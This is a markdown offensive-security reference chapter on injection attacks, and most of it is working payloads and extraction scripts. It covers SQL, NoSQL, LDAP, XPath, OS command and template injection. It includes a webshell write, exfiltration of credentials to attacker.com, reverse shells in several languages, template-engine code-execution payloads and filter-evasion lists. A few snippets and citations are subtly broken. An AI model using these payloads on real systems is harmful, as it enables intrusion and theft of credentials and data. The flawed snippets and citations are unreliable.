# Deep Dive: Injection Attacks

## 1. SQL Injection: Complete Exploitation Taxonomy

### 1.1 Union-Based SQL Injection

Union-based SQLi remains the most directly exploitable form when the application returns query results in the response. The UNION operator combines results from two or more SELECT statements, allowing data from other tables to be extracted alongside the legitimate query results.

```http
GET /api/v1/products?category=Electronics'+UNION+SELECT+1,2,3--+ HTTP/1.1
Host: shop.target.com
```

The initial challenge is determining the number and data types of columns in the original query:

```sql
-- Column count enumeration using ORDER BY
' ORDER BY 1--          → 200 (at least 1 column)
' ORDER BY 5--          → 200 (at least 5 columns)
' ORDER BY 6--          → 500 Error (5 columns total)

-- NULL padding for type-agnostic extraction
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL,NULL,NULL--     → 200 (column 1 is string)
' UNION SELECT NULL,'a',NULL,NULL,NULL--     → 200 (column 2 is string)
' UNION SELECT NULL,NULL,'a',NULL,NULL--     → 500 (column 3 is numeric)

-- Extract data once column types are identified
' UNION SELECT username,password,NULL,NULL,NULL FROM users--
' UNION SELECT table_name,column_name,NULL,NULL,NULL FROM information_schema.columns--
```

Database-specific UNION injection syntax:

```sql
-- MySQL: String concatenation via CONCAT
' UNION SELECT CONCAT(username,0x3a,password),NULL,NULL,NULL,NULL FROM users--

-- MySQL: Reading files (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL--

-- MySQL: Writing webshell (requires FILE privilege and writable directory)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--

-- PostgreSQL: Reading files via COPY or lo_import
' UNION SELECT lo_import('/etc/passwd'),NULL,NULL,NULL,NULL--

-- MSSQL: Reading files via OPENROWSET/BULK
' UNION SELECT BulkColumn,NULL,NULL,NULL,NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS--

-- Oracle: Reading files via UTL_FILE
' UNION SELECT UTL_FILE.FOPEN('/oracle/directory','file.txt','R'),NULL,NULL,NULL,NULL--
```

### 1.2 Blind SQL Injection

When the application doesn't return query results directly but does return different responses for true/false conditions, blind SQLi allows data extraction one bit at a time.

**Boolean-based blind SQLi** uses conditional expressions that produce different responses:

```sql
-- MySQL boolean blind
' AND (SELECT LENGTH(username) FROM users LIMIT 1) > 5--     → True response
' AND (SELECT LENGTH(username) FROM users LIMIT 1) > 10--    → False response
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--     → False
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='b'--     → False
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='c'--     → True

-- Optimized extraction using binary search
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64--   → True
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 96--   → True
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 112--  → False
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 104--  → True
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) = 109--  → True → char = 'm'
```

```python
# Automated boolean blind SQLi extraction
import requests
import string

def boolean_blind_extract(url, true_indicator, false_indicator):
    """Extract a string value from a boolean blind SQLi point."""
    result = ""
    
    # First, determine length
    length = 0
    for i in range(1, 1000):
        payload = f"' AND (SELECT LENGTH(secret) FROM secrets LIMIT 1) = {i}--"
        resp = requests.get(url + payload)
        if true_indicator in resp.text:
            length = i
            break
    
    # Then extract each character
    for pos in range(1, length + 1):
        low, high = 32, 126  # Printable ASCII range
        while low <= high:
            mid = (low + high) // 2
            payload = f"' AND ASCII(SUBSTRING((SELECT secret FROM secrets LIMIT 1),{pos},1)) > {mid}--"
            resp = requests.get(url + payload)
            if true_indicator in resp.text:
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] Extracted: {result}")
    
    return result
```

**Time-based blind SQLi** uses timing delays when no visible difference exists between true and false conditions:

```sql
-- MySQL time-based blind
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -

-- PostgreSQL time-based blind
' AND (SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -

-- MSSQL time-based blind
' IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') WAITFOR DELAY '0:0:5'-- -

-- SQLite time-based blind (no native sleep, use heavy computation)
' AND CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN LIKE('ABCDEFG%',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 1 END-- -

-- Oracle time-based blind
' AND (SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL) = 1--
```

### 1.3 Out-of-Band (OOB) SQL Injection

When all in-band techniques fail (no visible error, no timing difference), out-of-band extraction uses DNS or HTTP callbacks:

```sql
-- MySQL OOB via DNS (requires LOAD_FILE and DNS resolution)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',username,'.',password,'.attacker.com\\\\a')),NULL FROM users--
-- DNS query: admin.$2b$12$hash.attacker.com

-- MySQL OOB via HTTP (requires LOAD_FILE and UNC paths on Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\attacker.com\\\\', username, '_', password)),NULL FROM users--

-- MSSQL OOB via xp_dirtree (DNS exfiltration)
' UNION SELECT xp_dirtree(CONCAT('\\\\\\\\',username,'.',password,'.attacker.com\\\\a')),NULL FROM users--

-- MSSQL OOB via xp_cmdshell (direct HTTP)
' UNION SELECT xp_cmdshell(CONCAT('curl http://attacker.com/?data=',username,'_',password)),NULL FROM users--

-- Oracle OOB via UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST(CONCAT('http://attacker.com/?data=',username||'_'||password)),NULL FROM users--

-- Oracle OOB via UTL_TCP (DNS exfiltration)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(CONCAT(username,'.',password,'.attacker.com')),NULL FROM users--

-- PostgreSQL OOB via COPY (DNS exfiltration)
'; COPY (SELECT username||'_'||password FROM users) TO PROGRAM 'nslookup '||username||'.'||password||'.attacker.com';--
```

### 1.4 WAF Bypass Techniques for SQL Injection

```sql
-- Case variation bypass (case-insensitive SQL keywords)
SeLeCt * FrOm users WhErE username = 'admin'

-- SQL comment bypass
SEL/**/ECT * FR/**/OM users WHERE username = 'admin'
SELECT*FROM users WHERE username='admin'/**/OR/**/1=1

-- Double encoding bypass
%2527 → %27 → ' (double URL encoding)
%253C → %3C → < (used in XSS contexts)

-- Unicode normalization bypass
'u0073elect' → 'select' (Unicode normalization in some WAFs)
'ÕÈlect' → 'select' (via Unicode normalization)

-- Null byte bypass (terminates WAF pattern matching)
%00'SELECT * FROM users--
SELECT%00*%00FROM%00users--

-- Whitespace substitution (replace spaces with alternative whitespace)
SELECT\t*\tFROM\tusers\tWHERE\tusername='admin'   -- Tab
SELECT\n*\nFROM\nusers\nWHERE\nusername='admin'   -- Newline
SELECT\r*\rFROM\rusers\rWHERE\rusername='admin'   -- Carriage return
SELECT%0a*%0aFROM%0ausers%0aWHERE%0ausername='admin' -- URL-encoded newline

-- Alternative OR syntax
WHERE 1=1         → WHERE 2>1      → WHERE 'a'='a'
WHERE 1=1 OR 'a'='a'  → WHERE 1=1 OR 2>1

-- String concatenation (avoiding quotes)
SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))  -- builds "admin"
SELECT username FROM users WHERE username=0x61646D696E           -- hex-encoded "admin"

-- MySQL-specific bypasses
-- Equivalents for information_schema tables:
SELECT table_name FROM information_schema.tables
→ SELECT table_name FROM mysql.innodb_table_stats (MySQL 5.6+)
→ SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()

-- Bypassing comma-based WAF rules (for UNION SELECT column separation)
UNION SELECT 1,2,3
→ UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- Alternative conditional syntax
IF(condition, true_val, false_val)
→ CASE WHEN condition THEN true_val ELSE false_val END
→ ELT(condition, false_val, true_val)  -- MySQL-specific

-- Scientific notation bypass
WHERE id = 1
→ WHERE id = 1e0    -- 1e0 = 1.0 (float)
```

### 1.5 Second-Order SQL Injection

Second-order injection is particularly insidious because the payload is stored benignly and later used in a different query context where it becomes active:

```python
# User registration endpoint
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    # Input is properly escaped for INSERT
    db.execute("INSERT INTO users (username, password) VALUES (%s, %s)", 
               (username, hash_password(request.form['password'])))
    # Username "admin' --" is stored as-is in the database

# Password change endpoint (separate request, separate context)
@app.route('/change-password', methods=['POST'])
def change_password():
    username = session['username']  # Retrieved from session/database, NOT user input
    new_password = request.form['new_password']
    # TRUSTED because it comes from the session, NOT parameterized
    db.execute(f"UPDATE users SET password = '{hash_password(new_password)}' WHERE username = '{username}'")
    # Executed: UPDATE users SET password = '...' WHERE username = 'admin' --'
    # This modifies THE REAL admin account's password!
```

The defense against second-order injection is the same as first-order: always use parameterized queries, even for values from the database.

---

## 2. NoSQL Injection

### 2.1 MongoDB Operator Injection

MongoDB's query language uses JSON/BSON objects, enabling injection through query operators that aren't available in SQL:

```javascript
// Vulnerable Express.js route using query string directly
app.get('/api/users', (req, res) => {
    // req.query is automatically parsed from URL parameters
    // ?username=admin&password[$ne]=null
    // becomes: { username: "admin", password: { $ne: null } }
    User.find(req.query)
        .then(users => res.json(users))
        .catch(err => res.status(500).json({error: err.message}));
});

// Attack: Authentication bypass
// POST /api/login  with body: { "username": "admin", "password": { "$ne": "" } }
// Resulting MongoDB query:
// db.users.findOne({ username: "admin", password: { $ne: "" } })
// Matches any user where password is not empty → authentication bypassed!

// Attack: Data extraction using $regex
// POST /api/login  with body: { "username": { "$regex": "^admin" }, "password": { "$ne": "" } }
// Extracts users whose username starts with "admin"

// Attack: Full database extraction using $where
// GET /api/users?search[$where]=this.password.match(/.*/)
// $where allows arbitrary JavaScript execution within MongoDB
// GET /api/users?search[$where]=this.password[0]=='a'
// Character-by-character password extraction
```

```python
# Python MongoDB injection via query parameters
from flask import Flask, request
from pymongo import MongoClient

app = Flask(__name__)
db = MongoClient().mydb

@app.route('/api/users')
def find_users():
    # Flask's request.args handles nested parameters
    # ?username=admin&password[$ne]=null
    # becomes: {'username': 'admin', 'password': {'$ne': None}}
    query = dict(request.args)
    users = list(db.users.find(query))
    return jsonify([serialize_user(u) for u in users])

# Exploiting $where in Python MongoDB driver
# POST /api/search  body: {"$where": "this.password == 'secret'"}
# Equivalent to: db.users.find({"$where": "this.password == 'secret'"})
```

### 2.2 MongoDB Blind Injection

```python
# Blind MongoDB injection via conditional timing
# Similar to time-based blind SQLi but using MongoDB's sleep function

import requests
import time
import string

def blind_mongodb_extract(base_url, field, char_set=string.printable):
    """Extract a field value character by character using MongoDB regex."""
    extracted = ""
    
    for pos in range(1, 50):
        found = False
        for char in char_set:
            # Use $regex to match character at position
            payload = {
                "username": "admin",
                "password": {"$regex": f"^.{{{pos-1}}}{re.escape(char)}"}
            }
            
            start = time.time()
            response = requests.post(f"{base_url}/api/login", json=payload)
            elapsed = time.time() - start
            
            if response.status_code == 200:  # Login successful = regex matched
                extracted += char
                found = True
                break
        
        if not found:
            break
    
    return extracted

# Alternative: Using $expr and $substr for precise extraction
# {"$expr": {"$eq": [{"$substr": ["$password", 0, 1]}, "a"]}}
```

### 2.3 CouchDB Injection

```http
# CouchDB injection via view functions
GET /database/_design/users/_view/by_name?key="admin' OR 1=1--" HTTP/1.1

# CouchDB Map function injection (if user input reaches design documents)
# Vulnerable design document creation:
POST /database/_design/search HTTP/1.1
Content-Type: application/json

{
  "_id": "_design/search",
  "views": {
    "by_name": {
      "map": "function(doc) { emit(doc.name, doc.password); }"
    }
  }
}
```

---

## 3. LDAP Injection

### 3.1 LDAP Query Manipulation

LDAP (Lightweight Directory Access Protocol) is used by Active Directory, OpenLDAP, and other directory services. LDAP injection manipulates LDAP filter strings:

```python
# Vulnerable Python LDAP authentication
import ldap

def authenticate(username, password):
    conn = ldap.initialize('ldap://directory.company.com')
    try:
        conn.simple_bind_s(
            f'uid={username},ou=users,dc=company,dc=com',
            password
        )
        return True
    except ldap.INVALID_CREDENTIALS:
        return False

# Attack: Authentication bypass
# username = *)(&))
# Resulting DN: uid=*)(&)),ou=users,dc=company,dc=com
# LDAP interprets: (&(uid=*)(|(...))) → matches any user
```

```http
# LDAP search injection
# Vulnerable search:
# (&(cn=SEARCH_INPUT)(objectClass=user))

# Attack: Extract all users
# (&(cn=*)(objectClass=user))         → all users
# (&(cn=a*)(objectClass=user))        → users starting with 'a'

# Authentication bypass:
# (&(uid=USERNAME)(userPassword=PASSWORD))
# USERNAME = admin)(&))
# Result: (&(uid=admin)(&))(userPassword=PASSWORD))
# The &(uid=admin)(&)) matches, and userPassword check is bypassed

# Information disclosure:
# (&(cn=INPUT)(objectClass=user))
# INPUT = *)(objectClass=*)
# Result: (&(cn=*)(objectClass=*)) → all users regardless of class

# Blind LDAP extraction:
# (&(cn=INPUT)(objectClass=user))
# INPUT = a*)(cn=*)(|(cn=*
# Result: (&(cn=a*)(cn=*)(|(cn=*)(objectClass=user)))
# Successful response indicates cn starts with 'a'
```

### 3.2 LDAP Blind Extraction

```python
# Blind LDAP injection character-by-character extraction
import ldap
import string

def blind_ldap_extract(ldap_url, base_dn, attribute, known_cn):
    """Extract a sensitive attribute value via blind LDAP injection."""
    result = ""
    charset = string.ascii_letters + string.digits + string.punctuation
    
    for pos in range(1, 100):
        found = False
        for char in charset:
            # Test if the character at position matches
            search_filter = f"(&(cn={known_cn})({attribute}={result}{char}*))"
            try:
                conn = ldap.initialize(ldap_url)
                results = conn.search_s(base_dn, ldap.SCOPE_SUBTREE, search_filter)
                if results:
                    result += char
                    found = True
                    break
            except ldap.LDAPError:
                continue
        
        if not found:
            break
    
    return result

# Extract Active Directory attributes:
# sAMAccountName, mail, telephoneNumber, unicodePwd (hash), memberOf
```

---

## 4. XPath Injection

XPath injection targets XML data stores and XPath query interfaces:

```xml
<!-- Vulnerable XPath query -->
/users/user[username='INPUT_USERNAME' and password='INPUT_PASSWORD']

<!-- Attack: Authentication bypass -->
/users/user[username='' or '1'='1' and password='' or '1'='1']
<!-- Returns first user node -->

<!-- Attack: Extract data using string functions -->
/users/user[username='' or substring(password,1,1)='a' and '1'='1']
<!-- Returns user if first password character is 'a' -->

<!-- Blind XPath extraction -->
/users/user[username='admin' and string-length(password)=8 and '1'='1']
<!-- Returns admin user if password is 8 characters -->
```

```python
# Automated XPath blind extraction
def xpath_blind_extract(url, extract_expression, true_indicator):
    """Extract data via XPath injection using substring."""
    result = ""
    for pos in range(1, 100):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"' or substring({extract_expression},{pos},1) < '{chr(mid)}' or '1'='"
            resp = requests.post(url, data={"username": payload, "password": "anything"})
            if true_indicator in resp.text:
                high = mid - 1
            else:
                low = mid + 1
        result += chr(low)
    return result

# Extract password: xpath_blind_extract(url, "//user[username='admin']/password", "Welcome")
```

---

## 5. OS Command Injection

### 5.1 Command Injection Contexts

Command injection payloads must be adapted to the context in which user input is injected:

```python
# Context 1: Argument to a command
# ping -c 3 INPUT
# If INPUT filtering blocks ;|&`$() newlines:
INPUT = "127.0.0.1%0aid"  # URL-encoded newline bypass
INPUT = "127.0.0.1%0aid%0a"  # Command in new line

# Context 2: Inside quotes
# echo "INPUT" > /tmp/output
# Breaking out of quotes:
INPUT = '; id; echo "'     → echo "'; id; echo '"' > /tmp/output
INPUT = "$(id)"            → echo "$(id)" > /tmp/output     # Command substitution

# Context 3: Inside a variable assignment
# OUTPUT=$(echo "INPUT")
INPUT = "$(id)"             → OUTPUT=$(echo "$(id)")

# Context 4: Inside a case/esac or if/then block
# Any command terminator (;, |, &&, ||, \n) works

# Context 5: Template string in shell
# /bin/sh -c "ping -c 3 $INPUT"
# No quotes around $INPUT — direct command substitution
INPUT = "127.0.0.1; id"
INPUT = "127.0.0.1$(id)"
```

### 5.2 Blind Command Injection

When command output is not returned to the attacker:

```bash
# Time-based detection
INPUT = "127.0.0.1; sleep 5"
INPUT = "127.0.0.1|sleep 5"
INPUT = "127.0.0.1&&sleep 5"

# DNS exfiltration
INPUT = "127.0.0.1; nslookup attacker.com"
INPUT = "127.0.0.1; host $(whoami).attacker.com"
INPUT = "127.0.0.1; curl http://attacker.com/$(id|base64)"

# File-based exfiltration
INPUT = "127.0.0.1; id > /tmp/output"
# Then read via LFI: /tmp/output

# HTTP callback
INPUT = "127.0.0.1; curl http://attacker.com/$(id|tr '/' '_'|base64)"

# TCP exfiltration
INPUT = "127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# ICMP exfiltration
INPUT = "127.0.0.1; ping -c 1 -p $(echo 'id' | xxd -p) attacker.com"
```

### 5.3 Filter Evasion for Command Injection

```bash
# Bypassing space filters
cat${IFS}/etc/passwd              # Internal Field Separator
cat$IFS/etc/passwd               # Shorter IFS
{cat,/etc/passwd}                # Brace expansion
cat</etc/passwd                  # Input redirection
X=$'cat\x20/etc/passwd';$X       # ANSI-C quoting

# Bypassing command name filters
c'a't /etc/passwd                # String splitting (bash)
c\at /etc/passwd                 # Backslash escaping
/bin/cat /etc/passwd             # Absolute path
/usr/bin/c?t /etc/passwd         # Globbing
/bin/ca* /etc/passwd             # Glob wildcard
$(printf '\x63\x61\x74') /etc/passwd  # printf hex encoding

# Bypassing path filters
cat /???/????swd                  # Wildcard: /etc/passwd
cat /e\tc/p\ass\wd               # Backslash escaping
cat /etc/pas*                     # Wildcard ending

# Building commands without blocked characters
# If 'a' is blocked: printf '\x61' → 'a'
# If 'cat' is blocked: 
$(printf '\x63\x61\x74') /etc/passwd
# Using variable substitution:
a=c;b=a;c=t;$a$b$c /etc/passwd
# Using base64:
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Reverse shell without common commands
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e 'f=TCPSocket.new("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## 6. Server-Side Template Injection (SSTI)

### 6.1 SSTI Detection Methodology

Template injection detection follows a systematic approach, testing increasingly complex payloads:

```
Phase 1: Mathematical Expression
${7*7}          → 49 (Expression Language detected)
{{7*7}}         → 49 (Jinja2, Twig, or similar)
#{7*7}          → 49 (Thymeleaf, Ruby ERB interpolation)
*{7*7}          → 49 (Thymeleaf)
${7*7}          → 49 (SpEL, FreeMarker, Mako)

Phase 2: String Expression (differentiates engines)
{{7*'7'}}       → 7777777 (Jinja2 — Python string repetition)
{{7*'7'}}       → 49 (Twig — arithmetic)
${7*'7'}         → Error or 49 (FreeMarker)

Phase 3: Template Debugging
{{config}}       → Flask config dict (Jinja2)
{{self}}         → Template object (Django)
{{request}}      → Flask request object (Jinja2)
{{_}}            → Mako namespace

Phase 4: Engine Identification
{{''.__class__}}                → Python str class (Jinja2)
{{''.__class__.__mro__}}        → Python MRO (Jinja2)
{{directions|length}}           → Integer (Thymeleaf)
{{T(java.lang.Math).random()}}  → Double (Freemarker EL)
```

### 6.2 Jinja2 (Python) SSTI

Jinja2 is the most commonly exploited template engine due to its use in Flask, Django, and Ansible:

```python
# Jinja2 sandbox escape via Python class hierarchy

# Step 1: Access object base class
{{''.__class__}}                    → <class 'str'>
{{''.__class__.__mro__}}            → (<class 'str'>, <class 'object'>)
{{''.__class__.__mro__[1]}}         → <class 'object'>

# Step 2: Find useful subclasses
{{''.__class__.__mro__[1].__subclasses__()}}
# Returns list of all classes available in the Python runtime
# Find classes like: subprocess.Popen, os._wrap_close, etc.

# Step 3: Locate Popen class index
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
    {% if c.__name__ == 'Popen' %}{{ loop.index0 }}{% endif %}
{% endfor %}

# Step 4: Execute commands
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0]}}

# Alternative: Using os module from builtins
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternative: Using lipsum (available in Flask templates)
{{lipsum.__globals__['os'].popen('id').read()}}

# Alternative: Using request object
{{request.__class__.__mro__[1].__subclasses__()}}

# Alternative: Using cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Alternative: Using joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

**Jinja2 filter bypasses** — When certain characters or keywords are filtered:

```python
# If underscore is filtered: use attr filter
{{''|attr('__class__')|attr('__mro__')}}
# Instead of: ''.__class__.__mro__

# If [] is filtered: use __getitem__ or pop
{{''.__class__.__mro__.__getitem__(1)}}

# If | is filtered: use Jinja2 blocks
{% set x = ''.__class__.__mro__[1].__subclasses__() %}
{% for c in x %}{% if c.__name__ == 'Popen' %}{{c('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}{% endfor %}

# If request is filtered: use other global objects
{{config}}
{{get_flashed_messages.__globals__}}
{{url_for.__globals__}}
{{self._TemplateReference__context}}

# If quotes are filtered: use request arguments
{{request.args.x}}  # Pass payload via ?x=__class__
```

### 6.3 Twig (PHP) SSTI

```php
// Twig sandbox escape
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Twig file read
{{'/etc/passwd'|file_excerpt(1,30)}}

// Alternative RCE
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
{{{{app.request.server.all}}}}
```

### 6.4 Freemarker (Java) SSTI

```ftl
<#-- Freemarker RCE via Execute model -->
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<#-- Alternative: ObjectConstructor -->
<#assign objConstructor="freemarker.template.utility.ObjectConstructor"?new()>
${objConstructor("java.lang.ProcessBuilder","id").start()}

<#-- Alternative: JythonRuntime -->
<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
${jython.exec("id")}

<#-- Reading files -->
${"/etc/passwd"?new()>
```

### 6.5 ERB (Ruby) SSTI

```ruby
<%= system('id') %>
<%= `id` %>
<%= eval('puts `id`') %>
<%= open('|id').readlines() %>
<% IO.popen('id').readlines().each { |l| puts l } %>
```

### 6.6 Expression Language (Java EE) Injection

```java
// EL injection in JSP/GlassFish/WebLogic/Tomcat
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.ProcessBuilder).new('id').start()}
${request.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}

// Reading files via EL
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}

// Spring EL injection
${T(java.lang.Runtime).getRuntime().exec('id')}
new java.lang.ProcessBuilder({'id'}).start()
```

### 6.7 Mako (Python) SSTI

```python
${__import__('os').popen('id').read()}
${__import__('subprocess').check_output('id', shell=True)}
<% import os %>${os.popen('id').read()}
<%!
import os
%>${os.popen('id').read()}
```

---

## 7. Code Injection vs Command Injection

Understanding the distinction is critical for payload construction:

**Command injection** directly executes OS commands:
```python
# Vulnerable: shell=True enables command injection
subprocess.run(f'ping {user_input}', shell=True)
# Payload: 127.0.0.1; id
# Executes: ping 127.0.0.1; id
```

**Code injection** executes code within the application's runtime:
```python
# Vulnerable: eval/exec enables code injection
result = eval(user_input)        # Python code injection
result = exec(user_input)        # Python code injection

# Code injection is MORE POWERFUL than command injection:
# Code injection can execute OS commands AND access application internals
eval("__import__('os').popen('id').read()")  # OS command from code injection
eval("__import__('subprocess').check_output('id', shell=True)")  # Alternative
eval("open('/etc/passwd').read()")  # File read from code injection
eval("config.SECRET_KEY")  # Application data access
```

**PHP code injection:**
```php
// Vulnerable code
eval("\$result = $user_input;");

// Payloads
phpinfo();                                       // System information
system('id');                                     // OS command
file_get_contents('/etc/passwd');                // File read
include('http://attacker.com/shell.php');        // Remote code inclusion
```

---

## 8. Filter Evasion Techniques (Cross-Cutting)

### 8.1 Encoding-Based Evasion

```
Original payload: <script>alert(1)</script>

URL encoding:        %3Cscript%3Ealert(1)%3C/script%3E
Double URL encoding:  %253Cscript%253Ealert(1)%253C/script%253E
HTML entity encoding: &#60;script&#62;alert(1)&#60;/script&#62;
Hex encoding:        \x3cscript\x3ealert(1)\x3c/script\x3e
Unicode encoding:    \u003cscript\u003ealert(1)\u003c/script\u003e
Base64 encoding:     PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

SQL payload ' OR 1=1--:
URL encoded:   %27%20OR%201%3D1--
Double encoded: %2527%2520OR%25201%253D1--
Unicode:        %u0027 OR %u0031%u003D%u0031--
Hex:            0x27 OR 0x31=0x31--
```

### 8.2 HTTP Parameter Pollution

```http
# HTTP Parameter Pollution: sending duplicate parameters
# Different backends handle duplicates differently:

# PHP/Apache: last value wins
?user=alice&user=admin  → $_GET['user'] = 'admin'

# ASP.NET: first value wins, comma-separated
?user=alice&user=admin  → Request['user'] = 'alice,admin'

# Tomcat: first value wins
?user=alice&user=admin  → request.getParameter('user') = 'alice'

# Express.js (qs library): nested objects
?user[name]=alice&user[role]=admin  → {user: {name: 'alice', role: 'admin'}}

# HPP for WAF bypass:
# WAF sees: id=1 (first parameter)
# Backend sees: id=1 OR 1=1 (second parameter, if backend uses last)
GET /search?id=1&id=2+OR+1=1 HTTP/1.1

# HPP for authentication bypass:
# LoginForm expects: username=alice&password=secret
# Attack: username=alice&password=secret&role=admin
# If backend merges parameters, role=admin may override
```

### 8.3 JSON and XML Nesting

```http
# JSON injection: nested keys for bypassing validators
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "username": "alice",
  "email": "alice@example.com",
  "role": "user",
  "role": "admin"          // Duplicate key: many JSON parsers take the last value
}

# JSON to SQL injection via type confusion:
{"username": "admin", "password": {"$gt": ""}}  // MongoDB: password > anything

# XML injection: XXE within SOAP parameters
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
  <username>&xxe;</username>
  <password>anything</password>
</login>
```

---

## Cross-Reference Guide

| Topic | See Also |
|-------|----------|
| SQL injection contexts | `01b_owasp_top10_deep_dive.md` (A03) |
| WAF bypass techniques | `05b_waf_bypass_techniques.md` |
| SSTI exploitation | `04b_deserialization_race_conditions.md` (code injection) |
| OWASP injection category | `01b_owasp_top10_deep_dive.md` |
| NoSQL injection in APIs | `03b_api_security.md` |
| Testing methodology | `06a_web_security_testing.md` |
| Hardening techniques | `06b_web_hardening_defense.md` |

---

*Injection vulnerabilities span SQL, NoSQL, LDAP, XPath, OS commands, and template engines. Each requires a distinct exploitation approach, but all arise from the same root cause: untrusted data is interpreted as code. Parameterized queries, prepared statements, and strict input validation remain the universal defense.*

---

## References

1. OWASP Foundation. "SQL Injection." https://owasp.org/www-community/attacks/SQL_Injection
2. OWASP Foundation. "NoSQL Injection." https://owasp.org/www-project-top-ten/
3. OWASP Foundation. "Command Injection." https://owasp.org/www-community/attacks/Command_Injection
4. PortSwigger Ltd. "SQL Injection Cheat Sheet." https://portswigger.net/web-security/sql-injection/cheat-sheet
5. PortSwigger Ltd. "Server-Side Template Injection." https://portswigger.net/research/server-side-template-injection
6. Halfond, W.G.J., Viegas, J., and Orso, A. "A Classification of SQL Injection Attacks and Countermeasures." IEEE S&P, 2006.
7. Techtarget. "LDAP Injection." https://owasp.org/www-community/attacks/LDAP_Injection
8. PDTB. "Polyglot Payloads." https://github.com/swisskyrepo/PayloadsAllTheThings
9. OWASP Foundation. "LDAP Injection Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
10. OWASP Foundation. "Query Parameterization Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
11. NIST. "SP 800-53: Security and Privacy Controls." https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final